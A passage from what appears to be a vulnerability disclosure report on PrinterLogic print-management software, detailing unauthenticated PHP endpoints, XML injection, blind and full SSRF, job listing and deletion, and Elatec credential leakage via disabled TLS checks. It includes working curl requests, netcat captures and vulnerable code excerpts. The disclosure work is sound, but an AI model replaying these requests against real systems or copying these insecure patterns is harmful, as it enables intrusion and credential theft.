<pre><code>kali% nc -l -v -p 49629
listening on [any] 49629 ...
10.105.0.241: inverse host lookup failed: Host name lookup failure
connect to [10.105.0.239] from (UNKNOWN) [10.105.0.241] 58676
POST / HTTP/1.1
Host: 10.105.0.241
Accept: */*
x-datadog-trace-id: 932651358478891623
x-datadog-parent-id: 11324935202201644044
Content-Length: 652
Content-Type: application/x-www-form-urlencoded

&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;s:Header&gt;&lt;h:sessionHeader xmlns:h="http://www.toshibatec.co.jp/e-STUDIO/Common" xmlns="http://www.toshibatec.co.jp/e-STUDIO/Common" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;&lt;Token&gt;XML-INJECTION [1] XML injection
&lt;/Token&gt;&lt;/h:sessionHeader&gt;&lt;/s:Header&gt;&lt;s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;&lt;selectScreen xmlns="http://www.toshibatec.co.jp/e-STUDIO/DeviceService/DeviceControl"&gt;&lt;ScreenType&gt;Menu&lt;/ScreenType&gt;&lt;/selectScreen&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;
</code></pre>
<p>This code pattern can be found in several files, allowing an attacker to interact with remote printers without authentication or to disclose internal paths or variables:</p>
<p>Example - request without authentication leading to path disclosure:</p>
<pre><code>kali% curl "http://10.105.0.241/console_release/samsung/soap_server_0.php"
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;SOAP-ENV:Body&gt;&lt;SOAP-ENV:Fault&gt;&lt;faultcode&gt;WSDL&lt;/faultcode&gt;&lt;faultstring&gt;SOAP-ERROR: Parsing WSDL: Couldn't load from '/var/www/app/cons
ole_release/samsung/../../console_release/toshiba/wsdl/EventServiceBinding.wsdl' : failed to load external entity "/var/www/app/console_release/samsung/../../console_release/toshiba/wsdl/EventServiceBinding.wsdl"
&lt;/faultstring&gt;&lt;/SOAP-ENV:Fault&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;
</code></pre>
<p>The file <code>/www/app/console_release/samsung/get_device_info.php</code> allows reaching printers without authentication.</p>
<p>Content of <code>/web/www/app/console_release/samsung/get_device_info.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">if</span>( requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> ) <span style="color: #666666">!=</span> <span style="color: #666666">0</span> )
 <span style="color: #666666">12</span> {
 <span style="color: #666666">13</span>   <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> );
 <span style="color: #666666">14</span>   <span style="color: #19177C">$printer_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">load</span>( <span style="color: #19177C">$printer_vo</span> );
[<span style="color: #666666">...</span>]
 <span style="color: #666666">30</span>   <span style="color: #19177C">$header</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>();
 <span style="color: #666666">31</span>   <span style="color: #19177C">$header</span>[] <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Content-length: 0&#39;</span>;
 <span style="color: #666666">32</span>   <span style="color: #19177C">$header</span>[] <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Content-type: application/json&#39;</span>;
 <span style="color: #666666">33</span>   <span style="color: #19177C">$header</span>[] <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Authorization: OAuth oauth_signature=&quot;123456&quot;, oauth_version=&quot;1.0&quot;, oauth_consumer_key=&quot;test&quot;, oauth_signature_method=&quot;PLAINTEXT&quot;&#39;</span>;
 <span style="color: #666666">34</span> 
 <span style="color: #666666">35</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$header</span> );
 <span style="color: #666666">36</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span> );
 <span style="color: #666666">37</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:8080/ws/v1/tokenmgt/tokenmanager/createtoken&quot;</span> );
 <span style="color: #666666">38</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #008000; font-weight: bold">true</span> );
 <span style="color: #666666">39</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_USERPWD, <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$username</span><span style="color: #BA2121">:</span><span style="color: #BB6688; font-weight: bold">$password</span><span style="color: #BA2121">&quot;</span> );
 <span style="color: #666666">40</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_HTTPAUTH, CURLAUTH_BASIC );
</pre></div>

<p>Request to <code>http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2</code>:</p>
<pre><code>kali% curl "http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2"

error = Failed to connect to 10.105.0.239 port 8080: Connection refused
&lt;BR&gt;&lt;BR&gt;Array
(
)


Array
(
)
kali%
</code></pre>
<p>When the printer is reachable on the port 8080, we can see PrinterLogic sending a HTTP request.</p>
<p>Request to <code>http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2</code>:</p>
<pre><code>kali% curl "http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2"

error = Empty reply from server
&lt;BR&gt;&lt;BR&gt;Array
(
)


Array
(
)
kali%
</code></pre>
<p>On the server, acting as the printer, we receive this HTTP connection.</p>
<p>Request sent to the Printer by PrinterLogic without authentication:</p>
<pre><code>kali% nc -l -v -p 8080
listening on [any] 8080 ...
10.105.0.241: inverse host lookup failed: Host name lookup failure
connect to [10.105.0.239] from (UNKNOWN) [10.105.0.241] 52954
POST /ws/v1/tokenmgt/tokenmanager/createtoken HTTP/1.1
Host: 10.105.0.239:8080
Accept: */*
Content-length: 0
Content-type: application/json
Authorization: OAuth oauth_signature="123456", oauth_version="1.0", oauth_consumer_key="test", oauth_signature_method="PLAINTEXT"
x-datadog-trace-id: 843152030884643607
x-datadog-parent-id: 2752307119501071741
Expect: 100-continue

^C
kali%
</code></pre>
<p>The file <code>/var/www/app/console_release/common/rfid_check.php</code> doesn't check authentication and allow changing parameters of printers using 4 different operations. This is one of the operations:</p>
<p>Content of <code>/var/www/app/console_release/common/rfid_check.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">97</span> <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span>( requestint( <span style="color: #BA2121">&quot;rfid_delete&quot;</span>, <span style="color: #666666">0</span> ) <span style="color: #666666">!=</span> <span style="color: #666666">0</span> )
 <span style="color: #666666">98</span> {
 <span style="color: #666666">99</span>         <span style="color: #19177C">$rfid_dao</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> rfid_data_dao();
<span style="color: #666666">100</span>         <span style="color: #19177C">$rfid_vo</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> rfid_data_vo();
<span style="color: #666666">101</span> 
<span style="color: #666666">102</span>         <span style="color: #19177C">$rfid_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;rfid_delete&#39;</span>];
<span style="color: #666666">103</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&quot;</span>;<span style="color: #408080; font-style: italic">//$rfid_dao-&gt;delete_rfid( $rfid_vo );</span>
<span style="color: #666666">104</span> }
</pre></div>

<p>There is another example that may be used by a malicious admin to conduct blind SSRF. The resulting HTTP request sent by PrinterLogic will be: <code>http://IP_PRINTER/cgi-bin/direct/printer/prtappse/semenu?page=bundles</code>. Again there is no authentication:</p>
<p>Content of <code>/www/app/console_release/lexmark/dellCheck.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">require_once</span>( <span style="color: #BA2121">&quot;global.php&quot;</span> );
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">require_once</span>(ABSPATH<span style="color: #666666">.</span><span style="color: #BA2121">&quot;lib/dao/dbopen.php&quot;</span>);
  <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">require_once</span>( ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;lib/dao/printer_dao.php&quot;</span> );
  <span style="color: #666666">5</span> 
  <span style="color: #666666">6</span> <span style="color: #19177C">$printer_dao</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> printer_dao();
  <span style="color: #666666">7</span> <span style="color: #19177C">$printer_vo</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> printer_vo();
  <span style="color: #666666">8</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> );
  <span style="color: #666666">9</span> <span style="color: #19177C">$printer_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">load</span>( <span style="color: #19177C">$printer_vo</span> );
 <span style="color: #666666">10</span> 
 <span style="color: #666666">11</span> <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/cgi-bin/direct/printer/prtappse/semenu?page=bundles&quot;</span>;
 <span style="color: #666666">12</span> <span style="color: #19177C">$url_headers</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">get_headers</span>(<span style="color: #19177C">$url</span>);
 <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #19177C">$url_headers</span> <span style="color: #666666">||</span> <span style="color: #008000">strpos</span>(<span style="color: #19177C">$url_headers</span>[<span style="color: #666666">0</span>], <span style="color: #BA2121">&#39;200&#39;</span>) <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">false</span>)
 <span style="color: #666666">14</span> {
 <span style="color: #666666">15</span>     <span style="color: #19177C">$new_url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/esf/prtappse/semenu?page=bundles&quot;</span>;
 <span style="color: #666666">16</span>     <span style="color: #19177C">$new_url_headers</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">get_headers</span>(<span style="color: #19177C">$new_url</span>);
 <span style="color: #666666">17</span>     <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #19177C">$new_url_headers</span> <span style="color: #666666">||</span> <span style="color: #008000">strpos</span>(<span style="color: #19177C">$new_url_headers</span>[<span style="color: #666666">0</span>], <span style="color: #BA2121">&#39;200&#39;</span>) <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">false</span>)
 <span style="color: #666666">18</span>         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">19</span>     <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">20</span>         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$new_url</span>);
 <span style="color: #666666">21</span> }
 <span style="color: #666666">22</span> <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">23</span> {
 <span style="color: #666666">24</span>     <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$url</span>);
 <span style="color: #666666">25</span> }
 <span style="color: #666666">26</span> 
 <span style="color: #666666">27</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">mb_stripos</span>(<span style="color: #19177C">$contents</span>, <span style="color: #BA2121">&#39;Bundle ID&#39;</span>)){
 <span style="color: #666666">28</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;Lexmark&#39;</span>;
 <span style="color: #666666">29</span> }
</pre></div>

<p>The file <code>/var/www/app/console_release/fast_release/badge_register_process.php</code> manages the registration of badges used for authentication but this file doesn't support authentication.</p>
<p>The list of vulnerable PHP scripts is not exhaustive and the analysis was not completed due to the lack of time. A small sample has been provided in other sections with more in-depth analysis (SSRF).</p>
<p>A final example, the <code>/var/www/app/console_release/km/console.php</code> file allows to remove jobs or to list them without authentication:</p>
<p><img alt="" src="images/2025-vasion-report-1-release-05.png" /></p>
<p><a href="images/2025-vasion-report-1-release-05-full.png">Click here for full image</a></p>
<p>http://10.105.0.241/console_release/km/console.php?printer_id=1</p>
<p>This webpage will load the page <code>/var/www/app/state/query/console_release.php</code> that doesn't check authentication. The only authentication is disabled because <code>GLOBALS::$ENHANCED_SECURITY</code> is set to <code>0</code> by default.</p>
<p>Content of <code>/var/www/app/state/query/console_release.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">19</span> <span style="color: #008000; font-weight: bold">if</span>(GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$ENHANCED_SECURITY</span> <span style="color: #666666">==</span> <span style="color: #666666">1</span> ) {
 <span style="color: #666666">20</span> <span style="color: #408080; font-style: italic">// Make sure the user has been logged in and the session is valid</span>
 <span style="color: #666666">21</span>     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">session_is_valid_portal</span>()) {
 <span style="color: #666666">22</span>         respond_expired_json();
 <span style="color: #666666">23</span>         <span style="color: #008000; font-weight: bold">return</span>;
 <span style="color: #666666">24</span>     }
 <span style="color: #666666">25</span>     <span style="color: #19177C">$printer_id</span> <span style="color: #666666">=</span> GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">portal_get_printer_id</span>();
 <span style="color: #666666">26</span>     <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get_user_name_portal</span>();
 <span style="color: #666666">27</span>         <span style="color: #008000; font-weight: bold">if</span> (GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$LDAP_EMAIL_RELEASE</span> <span style="color: #666666">==</span> <span style="color: #666666">1</span> ) {
 <span style="color: #666666">28</span>         <span style="color: #19177C">$email</span> <span style="color: #666666">=</span> <span style="color: #19177C">$GLOBALS</span><span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getEmail</span>();
 <span style="color: #666666">29</span>     }
 <span style="color: #666666">30</span> } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">31</span>     <span style="color: #19177C">$printer_id</span> <span style="color: #666666">=</span> GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get_printer_id_from_request</span>();
 <span style="color: #666666">32</span> 
 <span style="color: #666666">33</span>     <span style="color: #008000; font-weight: bold">if</span> (requestint(<span style="color: #BA2121">&quot;enc&quot;</span>, <span style="color: #666666">0</span>) <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
 <span style="color: #666666">34</span>         <span style="color: #19177C">$decode_user</span> <span style="color: #666666">=</span> <span style="color: #008000">base64_decode</span>(<span style="color: #008000">urldecode</span>(requeststr(<span style="color: #BA2121">&quot;user&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span>)));
 <span style="color: #666666">35</span>         <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> <span style="color: #008000">urldecode</span>(<span style="color: #008000">substr</span>(<span style="color: #19177C">$decode_user</span>, <span style="color: #666666">0</span>, <span style="color: #666666">-30</span>));
 <span style="color: #666666">36</span>     } <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">37</span>         <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;user&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span>);
 <span style="color: #666666">38</span> 
 <span style="color: #666666">39</span>     <span style="color: #008000; font-weight: bold">if</span> (GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$LDAP_EMAIL_RELEASE</span> <span style="color: #666666">==</span> <span style="color: #666666">1</span>) {
 <span style="color: #666666">40</span> 
 <span style="color: #666666">41</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$user</span>) {
 <span style="color: #666666">42</span>             <span style="color: #19177C">$ldap_lookups</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> LdapLookups();
 <span style="color: #666666">43</span>             <span style="color: #19177C">$ldap_lookups</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">loadLdapSettings</span>();
 <span style="color: #666666">44</span>             <span style="color: #19177C">$email</span> <span style="color: #666666">=</span> <span style="color: #19177C">$ldap_lookups</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">lookupAdUserEmail</span>(<span style="color: #19177C">$user</span>);
 <span style="color: #666666">45</span>         }
 <span style="color: #666666">46</span>     }
 <span style="color: #666666">47</span> }
[<span style="color: #666666">...</span>]
<span style="color: #666666">156</span>                         <span style="color: #408080; font-style: italic">//process the rest of the rows</span>
<span style="color: #666666">157</span>                         <span style="color: #008000; font-weight: bold">while</span>( <span style="color: #19177C">$jobs_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">next_row</span>( <span style="color: #19177C">$jobs_vo</span> ))
<span style="color: #666666">158</span>                         {
<span style="color: #666666">159</span>                             <span style="color: #408080; font-style: italic">//only process unique job_uuid&#39;s once if there is a value returned</span>
<span style="color: #666666">160</span>                             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$uniqueJobHelper</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">hasJobUuidBeenProcessed</span>(<span style="color: #19177C">$jobs_vo</span>)) {
<span style="color: #666666">161</span>                                     <span style="color: #008000; font-weight: bold">continue</span>;
<span style="color: #666666">162</span>                             }
<span style="color: #666666">163</span>                             <span style="color: #008000">array_push</span>( <span style="color: #19177C">$messages</span>,
<span style="color: #666666">164</span>                                         <span style="color: #008000; font-weight: bold">array</span>(
<span style="color: #666666">165</span>                                                 <span style="color: #BA2121">&quot;queue_id&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&quot;queue_id&quot;</span>],
<span style="color: #666666">166</span>                                                 <span style="color: #BA2121">&quot;workstation_id&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&quot;workstation_id&quot;</span>],
<span style="color: #666666">167</span>                                                 <span style="color: #BA2121">&quot;job_num&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&quot;job_num&quot;</span>],
<span style="color: #666666">168</span>                                                 <span style="color: #BA2121">&quot;job_type&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&quot;job_type&quot;</span>],
<span style="color: #666666">169</span>                                                 <span style="color: #BA2121">&quot;document_title&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000">str_replace</span>( <span style="color: #BA2121">&#39;,&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&#39;document_title&#39;</span>] ),
<span style="color: #666666">170</span>                                                 <span style="color: #BA2121">&quot;pages&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&#39;pages&#39;</span>],
<span style="color: #666666">171</span>                                                 <span style="color: #BA2121">&quot;status&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&#39;status&#39;</span>],
<span style="color: #666666">172</span>                                                 <span style="color: #BA2121">&quot;submitted&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$jobs_vo</span>[<span style="color: #BA2121">&#39;submitted&#39;</span>]
<span style="color: #666666">173</span>                                         )
<span style="color: #666666">174</span>                                 );
<span style="color: #666666">175</span>                         }
<span style="color: #666666">176</span>                 }
<span style="color: #666666">177</span>                 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #008000">json_encode</span>( <span style="color: #19177C">$messages</span> );
</pre></div>

<p>Looking for <code>ENHANCED_SECURITY</code>:</p>
<pre><code>kali% rgrep 'ENHANCED_SECURITY' .
./config/settings.php.local:GLOBALS::$ENHANCED_SECURITY = 0; // Turn on Enhanced security for CPA
./config/settings.php:GLOBALS::$ENHANCED_SECURITY = 0; // Turn on Enhanced security for CPA
./lib/common/load-settings.php:    static $ENHANCED_SECURITY = 0; // Turn on Enhanced security for CPA
</code></pre>
<p>Using dynamic analysis, it was confirmed that the script doesn't check authentication.</p>
<p>It is then possible to extract information without authentication about the printed jobs for any user or to delete them. These information can be retrieved:</p>
<ul>
<li>Queue_id</li>
<li>Workstation_id</li>
<li>Job_num</li>
<li>Job_type</li>
<li>Document_title</li>
<li>Pages</li>
<li>Status</li>
<li>Submitted</li>
</ul>
<p>Futhermore, some debug code is still present:</p>
<p>Content of <code>/var/www/app/state/query/console_release.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">418</span>         <span style="color: #008000; font-weight: bold">if</span>( GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$CONSOLE_RELEASE_TESTING</span> <span style="color: #666666">==</span> <span style="color: #666666">1</span> )
<span style="color: #666666">419</span>         {
<span style="color: #666666">420</span>                 <span style="color: #008000">ob_start</span>();
<span style="color: #666666">421</span>                 <span style="color: #008000">print_r</span>( <span style="color: #19177C">$_POST</span> );
<span style="color: #666666">422</span>                 <span style="color: #19177C">$output</span> <span style="color: #666666">=</span> <span style="color: #008000">ob_get_clean</span>();
<span style="color: #666666">423</span>                 \Storage<span style="color: #666666">::</span><span style="color: #7D9029">disk</span>(<span style="color: #BA2121">&#39;cache&#39;</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">put</span>(<span style="color: #BA2121">&quot;xerox/z.txt&quot;</span>, <span style="color: #19177C">$output</span> );
<span style="color: #666666">424</span>         }
</pre></div>

<p>PHP webpages are reachable without authentication and allow an attacker to perform administrative tasks.</p>
<p>The code present in the <code>console_release</code> directory is poorly written and contains a big number of vulnerabilities.</p>
<p>The code allows an attacker to interact with remote printers without authentication.</p>
<p>It is possible to extract information without authentication about the printed jobs for any user or to delete them. </p>
<p><a id="va-pre-auth-password-disclosure"></a></p>
<h2>Details - Pre-authenticated Elatec password disclosure, Change to a malicious Elatec server and Blind-SSRF</h2>
<p>It is possible to remotely retrieve the Elatec password without authentication by using the script <code>/www/app/console_release/fast_release/elatec_tcpconv2.php</code> (PoC provided below).</p>
<p>It is also possible to change the Elatec server (Elatec TCPConv 2), used for RFID authentication, to a malicious server (PoC provided below).</p>
<p>Finally, it is possible to have a blind SSRF and a normal SSRF.</p>
<p>On line 20 and 21, the verification of SSL is disabled, allowing an attacker on the network to Man-In-The-Middle the connection.</p>
<p>Content of <code>/www/app/console_release/fast_release/elatec_tcpconv2.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
  <span style="color: #666666">9</span>     <span style="color: #19177C">$elatec_device</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> PrinterLogic\Models\ElatecSimpleBadgeReleaseDevice();
 <span style="color: #666666">10</span>     <span style="color: #19177C">$elatec</span> <span style="color: #666666">=</span> <span style="color: #19177C">$elatec_device</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get_elatec_fast_release_settings</span>(requestint(<span style="color: #BA2121">&quot;printer_id&quot;</span>, <span style="color: #666666">0</span>), requeststr(<span style="color: #BA2121">&#39;ip_address&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>));
 <span style="color: #666666">11</span> 
 <span style="color: #666666">12</span>     <span style="color: #19177C">$elatec_is_setup</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">false</span>;
 <span style="color: #666666">13</span>     <span style="color: #19177C">$elatec_port_is_setup</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">false</span>;
 <span style="color: #666666">14</span>     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_remote_host</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&#39;&#39;</span>) {
 <span style="color: #666666">15</span>         <span style="color: #19177C">$ch_check</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">16</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_URL, <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">ip_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:81/pages/setup_usb.php&quot;</span>);
 <span style="color: #666666">17</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_USERPWD, <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">username</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">password</span>); <span style="color: #408080; font-style: italic">// [1] leak of Elatec credentials</span>
 <span style="color: #666666">18</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 <span style="color: #666666">19</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">20</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);                                <span style="color: #408080; font-style: italic">// [2] Insecure SSL/TLS connection</span>
 <span style="color: #666666">21</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);                                <span style="color: #408080; font-style: italic">// [3] Insecure SSL/TLS connection</span>
 <span style="color: #666666">22</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch_check</span>, CURLOPT_TIMEOUT, <span style="color: #666666">30</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">51</span>         <span style="color: #19177C">$post_values</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;usb_newline=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">newline</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_tcp=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_tcp</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_local_port=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_local_port</span>
